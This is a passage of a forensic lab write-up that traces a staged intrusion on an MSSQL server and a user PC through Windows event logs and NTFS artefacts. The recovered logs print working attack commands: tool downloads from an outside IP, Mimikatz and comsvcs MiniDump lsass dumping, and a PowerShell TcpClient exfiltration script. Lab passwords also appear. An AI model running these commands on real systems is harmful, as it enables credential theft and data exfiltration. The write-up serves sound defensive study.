Because the attacker use `xp_cmdshell` to run commands on the MSSQL server, we should be able to find those logs via *Sysmon*. We can start by searching for the command that adds a new service account to the domain. 

``` sh
$ csvtool col 3,22 20260528092757_EvtxECmd_Output.csv | csvtool readable - | grep -e "net user"
2026-05-25 08:40:10.7549272 "C:\WINDOWS\system32\cmd.exe" /c net user backupsvc S3rvice!2026 /add
[REMOVED]
```

We can see `xp_cmdshell` is run from `C:\WINDOWS\system32\cmd.exe`. We can find more commands by searching for it. 

``` sh
$ csvtool col 3,22 20260528092757_EvtxECmd_Output.csv | csvtool readable - | grep -E -e "2026-05-25" | grep -e "\\\\cmd.exe"
[REMOVED]
# import GodPotato
2026-05-25 09:46:56.5594387 "C:\WINDOWS\system32\cmd.exe" /c powershell -c "Invoke-WebRequest http://2.2.81.61:9999/spoolsvc.exe -OutFile C:\ProgramData\spoolsvc.exe"
2026-05-25 09:47:06.0982822 "C:\WINDOWS\system32\cmd.exe" /c dir C:\ProgramData
2026-05-25 09:49:56.0471225 "C:\WINDOWS\system32\cmd.exe" /c C:\ProgramData\spoolsvc.exe -cmd "cmd /c whoami &gt; C:\ProgramData\sys.txt"
2026-05-25 09:50:56.3765888 "C:\WINDOWS\system32\cmd.exe" /c certutil -dump C:\ProgramData\spoolsvc.exe | more
[REMOVED]
# import Mimikatz
2026-05-25 10:29:59.0357326 "C:\WINDOWS\system32\cmd.exe" /c powershell -c "Invoke-WebRequest http://2.2.81.61:9999/adobe_updater.exe -OutFile C:\ProgramData\adobe_updater.exe"
2026-05-25 10:32:01.0775019 "C:\WINDOWS\system32\cmd.exe" /c powershell -c "Invoke-WebRequest http://2.2.81.61:9999/adob_updater.exe -OutFile C:\ProgramData\adob_updater.exe"
[REMOVED]
# use and remove Mimikatz
2026-05-25 11:34:10.4308790 "C:\WINDOWS\system32\cmd.exe" /c C:\ProgramData\adobe_updater.exe privilege::debug sekurlsa::logonpasswords exit
2026-05-25 11:35:13.9067166 "C:\WINDOWS\system32\cmd.exe" /c C:\ProgramData\adob_updater.exe privilege::debug sekurlsa::logonpasswords exit
2026-05-25 11:42:50.6886581 "C:\WINDOWS\system32\cmd.exe" /c del /f /q C:\ProgramData\adob_updater.exe
[REMOVED]
$ csvtool col 3,22 20260528092757_EvtxECmd_Output.csv | csvtool readable - | grep -E -e "2026-05-26" | grep -e "\\\\cmd.exe"
[REMOVED]
# dump lsass.exe memory
2026-05-26 03:44:16.8568442 "C:\WINDOWS\system32\cmd.exe" /c reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
2026-05-26 03:47:18.6119524 "C:\WINDOWS\system32\cmd.exe" /c tasklist | findstr lsass.exe
2026-05-26 03:47:57.8372021 "C:\WINDOWS\system32\cmd.exe" /c C:\ProgramData\spoolsvc.exe -cmd "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 744 C:\ProgramData\lsass.dmp full"
2026-05-26 03:48:30.4631980 "C:\WINDOWS\system32\cmd.exe" /c dir C:\ProgramData\lsass.dmp
# compress dump
2026-05-26 03:52:11.4931104 "C:\WINDOWS\system32\cmd.exe" /c powershell Compress-Archive -Path C:\ProgramData\lsass.dmp -DestinationPath C:\ProgramData\backup_2026.zip
2026-05-26 03:53:36.2490581 "C:\WINDOWS\system32\cmd.exe" /c dir C:\ProgramData\backup_2026.zip
[REMOVED]
# exfiltrate compressed file
2026-05-26 04:22:55.9324699 "C:\WINDOWS\system32\cmd.exe" /c echo $f=[System.IO.File]::ReadAllBytes("C:\ProgramData\backup_2026.zip") &gt; C:\ProgramData\exfil.ps1 &amp; echo $c=New-Object System.Net.Sockets.TcpClient("2.2.81.61",9999) &gt;&gt; C:\ProgramData\exfil.ps1 &amp; echo $s=$c.GetStream() &gt;&gt; C:\ProgramData\exfil.ps1 &amp; echo $s.Write($f,0,$f.Length) &gt;&gt; C:\ProgramData\exfil.ps1 &amp; echo $s.Close() &gt;&gt; C:\ProgramData\exfil.ps1 &amp; echo $c.Close() &gt;&gt; C:\ProgramData\exfil.ps1
2026-05-26 04:23:00.1669072 "C:\WINDOWS\system32\cmd.exe" /c type C:\ProgramData\exfil.ps1
2026-05-26 04:23:20.3586062 "C:\WINDOWS\system32\cmd.exe" /c powershell -ExecutionPolicy Bypass -File C:\ProgramData\exfil.ps1
[REMOVED]
# use credentials to access shared folder
2026-05-26 11:24:20.0239004 "C:\WINDOWS\system32\cmd.exe" /c net use Z: \\DESKTOP-BAH7OUO\Users /user:HDFLAB\john.doe "John1283!@#"
2026-05-26 11:24:30.2072564 "C:\WINDOWS\system32\cmd.exe" /c dir Z:
2026-05-26 11:25:58.2688729 "C:\WINDOWS\system32\cmd.exe" /c dir Z:\john.doe
2026-05-26 11:27:06.0225788 "C:\WINDOWS\system32\cmd.exe" /c dir Z:\john.doe\Documents
2026-05-26 11:28:06.5591628 "C:\WINDOWS\system32\cmd.exe" /c dir Z:\john.doe\Desktop
2026-05-26 11:29:57.3496903 "C:\WINDOWS\system32\cmd.exe" /c dir "Z:\john.doe\Desktop\업무용"
2026-05-26 11:31:13.2379933 "C:\WINDOWS\system32\cmd.exe" /c mkdir C:\ProgramData\cache
# copy sensitive data
2026-05-26 11:31:55.8751549 "C:\WINDOWS\system32\cmd.exe" /c copy "Z:\john.doe\Desktop\업무용\*.txt" C:\ProgramData\cache\
2026-05-26 11:32:26.7709877 "C:\WINDOWS\system32\cmd.exe" /c xcopy /E /I /Y "Z:\john.doe\Desktop\업무용\결재보고서" C:\ProgramData\cache\결재보고서
2026-05-26 11:32:48.1888808 "C:\WINDOWS\system32\cmd.exe" /c xcopy /E /I /Y "Z:\john.doe\Desktop\업무용\대외비" C:\ProgramData\cache\대외비
2026-05-26 11:33:11.9201489 "C:\WINDOWS\system32\cmd.exe" /c dir C:\ProgramData\cache
# compress and exfiltrate data
2026-05-26 11:33:33.9131875 "C:\WINDOWS\system32\cmd.exe" /c powershell Compress-Archive -Path C:\ProgramData\cache\* -DestinationPath C:\ProgramData\corp_docs.zip
2026-05-26 11:35:25.1668256 "C:\WINDOWS\system32\cmd.exe" /c echo $f=[System.IO.File]::ReadAllBytes("C:\ProgramData\corp_docs.zip") &gt; C:\ProgramData\exfil.ps1 &amp; echo $c=New-Object System.Net.Sockets.TcpClient("2.2.81.61",9999) &gt;&gt; C:\ProgramData\exfil.ps1 &amp; echo $s=$c.GetStream() &gt;&gt; C:\ProgramData\exfil.ps1 &amp; echo $s.Write($f,0,$f.Length) &gt;&gt; C:\ProgramData\exfil.ps1 &amp; echo $s.Flush() &gt;&gt; C:\ProgramData\exfil.ps1 &amp; echo Start-Sleep -Seconds 5 &gt;&gt; C:\ProgramData\exfil.ps1 &amp; echo $s.Close() &gt;&gt; C:\ProgramData\exfil.ps1 &amp; echo $c.Close() &gt;&gt; C:\ProgramData\exfil.ps1
2026-05-26 11:35:31.4850533 "C:\WINDOWS\system32\cmd.exe" /c powershell -ExecutionPolicy Bypass -File C:\ProgramData\exfil.ps1
2026-05-26 11:37:07.8924031 "C:\WINDOWS\system32\cmd.exe" /c del /f /q C:\ProgramData\corp_docs.zip &amp; del /f /q C:\ProgramData\exfil.ps1 &amp; rmdir /s /q C:\ProgramData\cache
[REMOVED]
```

The same logs found in the access logs can be found here. 

##### Analyzing security events

``` sh
$ fls -o 444416 generated-stream.vmdk 6605 | grep Security.evtx
r/r 164142-128-4:       Microsoft-Windows-SMBServer%4Security.evtx
r/r 164188-128-4:       Microsoft-Windows-Windows Firewall With Advanced Security%4ConnectionSecurity.evtx
r/r 163998-128-4:       Security.evtx
r/r 164083-128-4:       Microsoft-Windows-SmbClient%4Security.evtx
$ icat -o 444416 generated-stream.vmdk 163998 > Security.evtx
$ EvtxECmd -f Security.evtx --csv .
```

We can use the *Apache* logs to find out when the attacker first gained access, then view events at that time. 

``` sh
$ cat access.log.2 | grep -e "adob_updater.exe" | grep del | head -n 1 | cut -d" " -f 4,5
[25/May/2026:12:15:26 +0000]
$ csvtool col 3,22 20260528092757_EvtxECmd_Output.csv | csvtool readable - | grep -e "adob_updater\.exe" | grep "del" | cut -d" " -f 1,2
2026-05-25 11:42:50.6886581
$ cat access.log.2 | grep whoami | head -n 1 | cut -d" " -f 4,5
[25/May/2026:04:17:53 +0000]
```

`12:15:26` in *access.log.2* is `11:42:50` in the *Sysmon* evtx file. The attacker first gained access at `04:17` according to the access log, meaning starting around `03:44` there should be relevant events in *Security.evtx*. 

``` sh
$ csvtool col 3,13 20260602063852_EvtxECmd_Output.csv | grep -E -e "05-25 03:[4-9]{1}[0-9]{1}:[0-9]{2}" -e "05-25 0[3-9]{1}:[0-9]{2}:[0-9]{2}"
[REMOVED]
2026-05-25 08:33:44.7189857,An account was logged off
2026-05-25 08:40:10.8512297,A member was added to a security-enabled global group
2026-05-25 08:40:10.8542240,A new account was created
2026-05-25 08:40:10.8971513,A user account was enabled
2026-05-25 08:40:10.8976311,A user account was changed
2026-05-25 08:40:10.8976738,An attempt was made to reset an account's password
2026-05-25 08:40:10.9029349,A member was added to a security-enabled local group
2026-05-25 08:40:30.8546225,A member was added to a security-enabled local group
[REMOVED]
```

This must be when the attacker created a new service. 

``` sh
$ csvtool col 3,22 20260528092757_EvtxECmd_Output.csv | csvtool readable - | grep -e "net user" | head -n 1
2026-05-25 08:40:10.7549272 "C:\WINDOWS\system32\cmd.exe" /c net user backupsvc S3rvice!2026 /add
```

##### Analyzing MSSQL transaction logs
MSSQL transaction logs, *.ldf*, can be analyzed with commands such as `DBCC LOG` from the server or third party tools. Unfortunately, I no longer have access to the MSSQL server and the third party tools are not cheap so I will have to skip this. 

Transaction logs seem to contain transactions, not query logs so it probably would not have had much information anyway. 

##### Analyzing *Powershell* history 

I'm not sure *Powershell* commands run from *cmd.exe* with `\c` will leave logs, but let's try extracting the history file. 

``` sh
$ fls -o 444416 generated-stream.vmdk 5 | grep "Users"
d/d 1903-144-5: Users
$ fls -o 444416 generated-stream.vmdk 1903
d/d 133-144-6:  Administrator
d/d 2354-144-6: Administrator.HDFLAB
d/d 39901-144-1:        All Users
d/d 211839-144-5:       dbadmin
d/d 1904-144-5: Default
d/d 38655-144-1:        Default User
r/r 38658-128-1:        desktop.ini
d/d 166119-144-5:       john.doe
d/d 1952-144-5: Public
d/d 202815-144-6:       SQLService
```

We do not know which user the commands were run as. We can easily find out using the *Sysmon* logs. 

``` sh
$ csvtool col 14,22 20260528092757_EvtxECmd_Output.csv | csvtool readable - | grep "whoami" | head -n 1
HDFLAB\SQLService                                                  "C:\WINDOWS\system32\cmd.exe" /c C:\ProgramData\spoolsvc.exe -cmd "cmd /c whoami &gt; C:\ProgramData\sys.txt"
```

We can continue our search for the history file. 

``` sh
$ fls -o 444416 generated-stream.vmdk 202815 | grep "AppData"
d/d 202826-144-1:       AppData
$ fls -o 444416 generated-stream.vmdk 202826
d/d 202846-144-5:       Local
[REMOVED]
$ fls -o 444416 generated-stream.vmdk 202846 | grep Microsoft
d/d 202848-144-6:       Microsoft
$ fls -o 444416 generated-stream.vmdk 202848 | grep Windows
d/d 202852-144-5:       Windows
[REMOVED]
$ fls -o 444416 generated-stream.vmdk 202852 | grep PowerShell
d/d 211735-144-1:       PowerShell
$ fls -o 444416 generated-stream.vmdk 211735
r/r 211736-128-4:       ModuleAnalysisCache
r/r 211769-128-4:       StartupProfileData-NonInteractive
```

As expected, there is no history left for these commands. 

##### Analyzing *$MFT* 
Multiple files were created during the attack, so let's see if we can find any traces in the *$MFT* file.

``` sh
$ icat -o 444416 generated-stream.vmdk 0 > MFT_file
$ MFTECmd -f MFT_file --csv .
$ csvtool col 1,3,6,7,12 20260601024149_MFTECmd_\$MFT_Output.csv | grep -e "exfil.ps1" -e "corp_docs.zip" -e "ProgramData\\\\cache" -e "backup_2026.zip" -e "adobe_" -e "adob_" -e "spoolsvc.exe" -e "sys.txt" -e "lsass.dmp" -e "EntryNumber" | csvtool readable -
EntryNumber InUse ParentPath    FileName         IsDirectory
211825      True  .\ProgramData spoolsvc.exe     False
211826      True  .\ProgramData sys.txt          False
213511      True  .\ProgramData adobe_update.exe False
213821      False .\ProgramData exfil.ps1        False
213991      False .\ProgramData corp_docs.zip    False
```

*spoolsvc.exe* and *adobe_update.exe* as well as *sys.txt* used to store the result of *spoolsvc.exe* are left undeleted.

##### Analyzing *adobe_update.exe*
``` sh
$ istat -o 444416 generated-stream.vmdk 213511
[REMOVED]
$FILE_NAME Attribute Values:
Flags: Archive, Not Content Indexed
Name: adobe_update.exe
Parent MFT Entry: 1760  Sequence: 1
Allocated Size: 0       Actual Size: 0
Created:        2026-05-25 20:50:17.396798700 (KST)
File Modified:  2026-05-25 20:50:17.396798700 (KST)
MFT Modified:   2026-05-25 20:50:17.396798700 (KST)
Accessed:       2026-05-25 20:50:17.396798700 (KST)
[REMOVED]
$ icat -o 444416 generated-stream.vmdk 213511 > adobe_update.exe
$ sha256sum adobe_update.exe
92804faaab2175dc501d73e814663058c78c0a042675a8937266357bcfb96c50  adobe_update.exe
```

![[adobe_update_VT.png]]

A quick search confirms the file is *Mimikatz*.

##### Analyzing *spoolsvc.exe*
``` sh
$ istat -o 444416 generated-stream.vmdk 211825
[REMOVED]
$FILE_NAME Attribute Values:
Flags: Archive, Not Content Indexed
Name: spoolsvc.exe
Parent MFT Entry: 1760  Sequence: 1
Allocated Size: 0       Actual Size: 0
Created:        2026-05-25 19:28:34.860559400 (KST)
File Modified:  2026-05-25 19:28:34.860559400 (KST)
MFT Modified:   2026-05-25 19:28:34.860559400 (KST)
Accessed:       2026-05-25 19:28:34.860559400 (KST)
[REMOVED]
$ icat -o 444416 generated-stream.vmdk 211825 > spoolsvc.exe
$ sha256sum spoolsvc.exe
9a8e9d587b570d4074f1c8317b163aa8d0c566efd88f294d9d85bc7776352a28  spoolsvc.exe
```

![[spoolsvc_VT.png]]

*spoolsvc.exe* is indeed *GodPotato.exe* as we suspected. 

##### Analyzing *sys.txt*
``` sh
$ istat -o 444416 generated-stream.vmdk 211826
$FILE_NAME Attribute Values:
[REMOVED]
Flags: Archive, Not Content Indexed
Name: sys.txt
Parent MFT Entry: 1760  Sequence: 1
Allocated Size: 0       Actual Size: 0
Created:        2026-05-25 19:28:48.701403600 (KST)
File Modified:  2026-05-25 19:28:48.701403600 (KST)
MFT Modified:   2026-05-25 19:28:48.701403600 (KST)
Accessed:       2026-05-25 19:28:48.701403600 (KST)
[REMOVED]
$ icat -o 444416 generated-stream.vmdk 211826
nt authority\system
```

Because *sys.txt* was created with the `whoami` command run with *GodPotato*, this shows *GodPotato* successfully escalated privileges. 

##### Analyzing *exfil.ps1*
``` sh
$ istat -o 444416 generated-stream.vmdk 213821
[REMOVED]
$FILE_NAME Attribute Values:
Flags: Archive, Not Content Indexed
Name: exfil.ps1
Parent MFT Entry: 1760  Sequence: 1
Allocated Size: 0       Actual Size: 0
Created:        2026-05-26 20:35:25.197909400 (KST)
File Modified:  2026-05-26 20:35:25.197909400 (KST)
MFT Modified:   2026-05-26 20:35:25.197909400 (KST)
Accessed:       2026-05-26 20:35:25.197909400 (KST)
[REMOVED]
$ icat -o 444416 generated-stream.vmdk 213821
$f=[System.IO.File]::ReadAllBytes("C:\ProgramData\corp_docs.zip")  
$c=New-Object System.Net.Sockets.TcpClient("2.2.81.61",9999)  
$s=$c.GetStream()  
$s.Write($f,0,$f.Length)  
$s.Flush()  
Start-Sleep -Seconds 5  
$s.Close()  
$c.Close()
```

*Powershell* script to exfiltrate data. The data in the script is the data gathered from the shared folder, but it is likely the same script was used to exfiltrate *lsass.dmp* as well. 

##### Analyzing *corp_docs.zip*
``` sh
$ istat -o 444416 generated-stream.vmdk 213991
[REMOVED]
$FILE_NAME Attribute Values:
Flags: Archive, Not Content Indexed
Name: corp_docs.zip
Parent MFT Entry: 1760  Sequence: 1
Allocated Size: 0       Actual Size: 0
Created:        2026-05-26 20:33:37.471821200 (KST)
File Modified:  2026-05-26 20:33:37.471821200 (KST)
MFT Modified:   2026-05-26 20:33:37.471821200 (KST)
Accessed:       2026-05-26 20:33:37.471821200 (KST)
[REMOVED]
$ icat -o 444416 generated-stream.vmdk 213991 > corp_docs.zip
$ unzip corp_docs.zip
[REMOVED]
$ head -n 5 *.txt
==> ы╣Ды▓И.txt <==
웹서버
JohnDoe, JD@HDFL.com, d8jmf981

도메인
john.doe, John1283!@#

==> ып╕ъ╡н ъ│аъ░Э ыжмьКдэК╕.txt <==
Name: Melissa Sanchez
Email: melissa.sanchez@example.org
Phone: (770)932-9653
----------------------------------------
Name: Dr. Michelle Miranda

==> ьЧ░ыЭ╜ь▓Ш.txt <==
IT 매니저 최현우님
- ChoiIT@HDFL.com
- 010-4821-7745

개발팀장 강태윤님
```

Though the file and folder names were corrupted for some reason, the contents were intact.

##### Analyzing *$UsnJrnl* 

We should be able to find records of files being created in the *$UsnJrnl* file. 

``` sh
$ fls -o 444416 generated-stream.vmdk 5 | grep Extend
d/d 11-144-4:   $Extend
$ fls -o 444416 generated-stream.vmdk 11 | grep UsnJrnl
r/r 183700-128-3:       $UsnJrnl:$J
r/r 183700-128-9:       $UsnJrnl:$Max
$ icat -o 444416 generated-stream.vmdk 183700 > UsnJrnl
```

Using *NTFS Log Tracker*, we can analyze the *UsnJrnl* file. 

![[Jrnl_adobe_file.png]]

![[Jrnl_exfil_file.png]]

![[Jrnl_backup_file.png]]

![[Jrnl_cache_dir.png]]

![[Jrnl_cache_files.png]]

We can see records of files and directories that were inside the `cache` directory. We can also see the reference numbers that we can use to search for and even extract the files. 

``` sh
$ csvtool col 1,2,3,4,7 20260601024149_MFTECmd_\$MFT_Output.csv | csvtool readable - | grep -e EntryNumber -e 211797
EntryNumber SequenceNumber InUse ParentEntryNumber FileName
211797      25             False 166056            대외비
213836      6              False 211797            1분기 매출 현황(Q1_report).txt
213895      3              False 211797            대외비 문서(client_contact).txt
213972      3              False 211797            신입사원명단(HR_list).txt
```

![[Jrnl_corpdocs_file.png]]

![[Jrnl_lsassdmp_file.png]]

![[Jrnl_spoolsvc_file.png]]


##### Analyzing *$LogFile*

``` sh
$ icat -o 444416 generated-stream.vmdk 2 > LogFile
```

![[LogFile_backup_file.png]]

![[LogFile_copy_creation.png]]

![[LogFile_copy_delete.png]]

![[LogFile_exfil_creation.png]]

![[LogFile_JohnDoe_creation.png]]

Besides the same files, we can also see directories for user "john.doe" being created, meaning that user logged in. And the timestamp is a few minutes before *lsass.dmp* is created. This means the dump file should contain credentials for "john.doe". This explains where the attacker got the credentials from. 

##### Analyzing SRUM
SRUM should contain the executable files executed by the attacker and the bytes sent and received from the webserver. 

``` sh
$ csvtool col 1,3,6,7 20260601024149_MFTECmd_\$MFT_Output.csv | grep SRUDB.dat
165350,True,.\Windows\System32\sru,SRUDB.dat
$ icat -o 444416 generated-stream.vmdk 165350 > SRUDB.dat
$ csvtool col 1,3,6,7 20260601024149_MFTECmd_\$MFT_Output.csv | grep SOFTWARE
163617,True,.\Windows\System32\config,SOFTWARE.LOG1
163618,True,.\Windows\System32\config,SOFTWARE.LOG2
163622,True,.\Windows\System32\config,SOFTWARE
[REMOVED]
```

![[SRUM_error1.png]]

![[SRUM_error2.png]]

Because the image was taken from a Windows 11 machine, I could not repair the database.

##### Analyzing prefetch files
``` sh
$ csvtool col 1,3,6,7 20260601024149_MFTECmd_\$MFT_Output.csv | grep -e "\.pf" -e "Prefetch"
$ fls -o 444416 generated-stream.vmdk 164128
```

There are no prefetch files. 

##### Analyzing Shimcache

``` sh
$ csvtool col 1,3,6,7 20260601024149_MFTECmd_\$MFT_Output.csv | grep -e "SYSTEM"
163606,True,.\Windows\System32\config,SYSTEM.LOG2
163607,True,.\Windows\System32\config,SYSTEM.LOG1
163614,True,.\Windows\System32\config,SYSTEM
163691,True,.\Windows\System32\config\RegBack,SYSTEM
$ icat -o 444416 generated-stream.vmdk 163614 > SYSTEM
$ icat -o 444416 generated-stream.vmdk 163607 > SYSTEM.LOG1
$ icat -o 444416 generated-stream.vmdk 163606 > SYSTEM.LOG2
```

Viewing the registry with *RegistryExplorer*, I found the *.exe* files used by the attacker. 

![[AppCompatCache_exes.png]]

#### 2.3. User PC

The User PC was accessed via SMB and had files exfiltrated. Because there was no attacker activity on it, the only artifacts should be the access events in *Security.evtx* and maybe SRUM. 

##### Analyzing *Security.evtx*
``` sh
$ mmls User\ PC\ disk-0.vmdk
GUID Partition Table (EFI)
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Safety Table
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  Meta      0000000001   0000000001   0000000001   GPT Header
003:  Meta      0000000002   0000000033   0000000032   Partition Table
004:  000       0000002048   0000411647   0000409600   Basic data partition
005:  001       0000411648   0000444415   0000032768   Microsoft reserved partition
006:  002       0000444416   0082139135   0081694720   Basic data partition
007:  003       0082139136   0083881983   0001742848
$ fsstat User\ PC\ disk-0.vmdk -o 444416 | grep -e "Root Directory"
Root Directory: 5
$ fsstat User\ PC\ disk-0.vmdk -o 444416 | grep Root^C
$ fls User\ PC\ disk-0.vmdk -o 444416 5 | grep Windows
d/d 1960-144-9: Windows
$ fls User\ PC\ disk-0.vmdk -o 444416 1960 | grep System32
d/d 5234-144-7: System32
$ fls User\ PC\ disk-0.vmdk -o 444416 5234 | grep winevt
d/d 6604-144-1: winevt
$ fls User\ PC\ disk-0.vmdk -o 444416 6604 | grep Logs
d/d 6605-144-6: Logs
$ fls User\ PC\ disk-0.vmdk -o 444416 6605 | grep -e "Security.evtx"
r/r 164142-128-4:       Microsoft-Windows-SMBServer%4Security.evtx
r/r 164188-128-4:       Microsoft-Windows-Windows Firewall With Advanced Security%4ConnectionSecurity.evtx
r/r 163998-128-4:       Security.evtx
r/r 164083-128-4:       Microsoft-Windows-SmbClient%4Security.evtx
$ icat User\ PC\ disk-0.vmdk -o 444416 164142 > Microsoft-Windows-SMBServer%4Security.evtx
$ icat User\ PC\ disk-0.vmdk -o 444416 164188 > "Microsoft-Windows-Windows Firewall With Advanced Security%4ConnectionSecurity.evtx"
$ icat User\ PC\ disk-0.vmdk -o 444416 163998 > Security.evtx
$ icat User\ PC\ disk-0.vmdk -o 444416 164083 > "Microsoft-Windows-SmbClient%4Security.evtx"
$ EvtxECmd -d . --csv .
```

With all relevant *.evtx* files extracted, we can start to analyze them.

``` sh
# User PC Security evtx files
$ csvtool col 1,3,13,24 20260604024302_EvtxECmd_Output.csv | csvtool readable - | grep -E -e "05-26" -e "05-25" | grep -e "failed"
[REMOVED]
81           2026-05-26 09:45:43.8273858 The SMB client failed to connect to the share                                 ./Microsoft-Windows-SmbClient%4Security.evtx
82           2026-05-26 09:45:43.8285327 The SMB client failed to connect to the share                                 ./Microsoft-Windows-SmbClient%4Security.evtx
[REMOVED]
# DB01 Sysmon evtx
$ csvtool col 3,22 20260528092757_EvtxECmd_Output.csv | csvtool readable - | grep -E -e "2026-05-26 09:4[0-9]{1}"
[REMOVED]
2026-05-26 09:45:43.6213101 "C:\WINDOWS\system32\cmd.exe" /c cmd /c dir "\\DESKTOP-BAH7OUO\C$"
2026-05-26 09:45:43.6485375 cmd  /c dir "\\DESKTOP-BAH7OUO\C$"
```

We can look up the time of the first 2 events in the *Sysmon* events to see what caused them. They were caused by the attacker attempting to read the root directory without credentials.

``` sh
# User PC Security evtx files
$ csvtool col 1,3,13,24 20260604024302_EvtxECmd_Output.csv | csvtool readable - | grep -E -e "05-26" | grep -e "explicit credentials"
[REMOVED]
4712         2026-05-26 11:24:20.1553606 A logon was attempted using explicit credentials                              ./Security.evtx
[REMOVED]
# DB01 Sysmon evtx
$ csvtool col 3,22 20260528092757_EvtxECmd_Output.csv | csvtool readable - | grep -E -e "2026-05-26" | grep -e "net use"
[REMOVED]
2026-05-26 11:24:20.0239004 "C:\WINDOWS\system32\cmd.exe" /c net use Z: \\DESKTOP-BAH7OUO\Users /user:HDFLAB\john.doe "John1283!@#"
```

If we keep searching, we can also find the point the attacker gained access to the shared directory.

``` sh
# DB01 Sysmon evtx
$ csvtool col 3,22 20260528092757_EvtxECmd_Output.csv | csvtool readable - | grep -E -e "2026-05-26" | grep -e "net use"
2026-05-26 09:03:43.9934435 "C:\WINDOWS\system32\cmd.exe" /c net user /domain
2026-05-26 09:09:57.5665225 "C:\WINDOWS\system32\cmd.exe" /c net user svc_backup /domain
2026-05-26 10:01:14.3220501 "C:\WINDOWS\system32\cmd.exe" /c net use \\\\DESKTOP-BAH7OUO\IPC$
2026-05-26 10:10:43.4555379 "C:\WINDOWS\system32\cmd.exe" /c net use \\\\DESKTOP-BAH7OUO\IPC$ /user:HDFLAB\dbadmin "Dbhspace1!"
2026-05-26 10:32:24.8142307 "C:\WINDOWS\system32\cmd.exe" /c net use \\\\DESKTOP-BAH7OUO\IPC$ /user:HDFLAB\dbadmin "Dbhspace1!"
2026-05-26 11:13:23.3418848 "C:\WINDOWS\system32\cmd.exe" /c net use * /delete /y
2026-05-26 11:13:43.1320605 "C:\WINDOWS\system32\cmd.exe" /c net use \\\\DESKTOP-BAH7OUO\SharedDocs /user:HDFLAB\john.doe "John1283!@#"
2026-05-26 11:15:31.2845371 "C:\WINDOWS\system32\cmd.exe" /c net use \\\\DESKTOP-BAH7OUO\C$ /user:HDFLAB\john.doe "John1283!@#"
2026-05-26 11:24:20.0239004 "C:\WINDOWS\system32\cmd.exe" /c net use Z: \\DESKTOP-BAH7OUO\Users /user:HDFLAB\john.doe "John1283!@#"
# User PC Security evtx files
$ csvtool col 1,3,13,24 20260604024302_EvtxECmd_Output.csv | csvtool readable - | grep -E -e "2026-05-26 09:03" -e "2026-05-26 09:09" -e "2026-05-26 10:01" -e "2026-05-26 10:10" -e "2026-05-26 10:32" -e "2026-05-26 11:13" -e "2026-05-26 11:15"
```

I attempted to find event logs for each `net use` command, but could not find them. I do not understand why. 

##### Analyzing SRUM
``` sh
$ fls User\ PC\ disk-0.vmdk -o 444416 5 | grep Windows
d/d 1960-144-9: Windows
$ fls User\ PC\ disk-0.vmdk -o 444416 1960 | grep System32
d/d 5234-144-7: System32
$ fls User\ PC\ disk-0.vmdk -o 444416 5234 | grep sru
[REMOVED]
d/d 6378-144-5: sru
[REMOVED]
$ fls User\ PC\ disk-0.vmdk -o 444416 6378 | grep SRUDB.dat
r/r 165350-128-3:       SRUDB.dat
$ fls User\ PC\ disk-0.vmdk -o 444416 5234 | grep config
d/d 5330-144-6: config
[REMOVED]
$ fls User\ PC\ disk-0.vmdk -o 444416 5330 | grep SOFTWARE
r/r 163622-128-4:       SOFTWARE
r/r 163617-128-5:       SOFTWARE.LOG1
r/r 163618-128-5:       SOFTWARE.LOG2
$ icat User\ PC\ disk-0.vmdk -o 444416 163622 > SOFTWARE
```

I was unable to repair the database again. I have no idea why. 

## 3. Reflection
This was my first time experiencing an AD environment. I had studied the concepts before, but actually using it was completely different. I was not the one to create the AD environment and connect the MSSQL server, but still things got confusing at times with both DB accounts and AD accounts. 

Also, I have regrets about the environment we set up. A more refined website, more dummy data on the user PC, and more tables in the database would have made the environment more realistic and possibly difficult to analyze. 

However, I was able to learn a lot just by preparing the scenario and getting everything ready. For example, I found out which logs are created when the network interface changes, MSSQL transaction logs, and various evtx logs for the DC. And that's just the forensics knowledge, I also learned about IP aliasing, creating MSSQL and AD accounts, and more. 
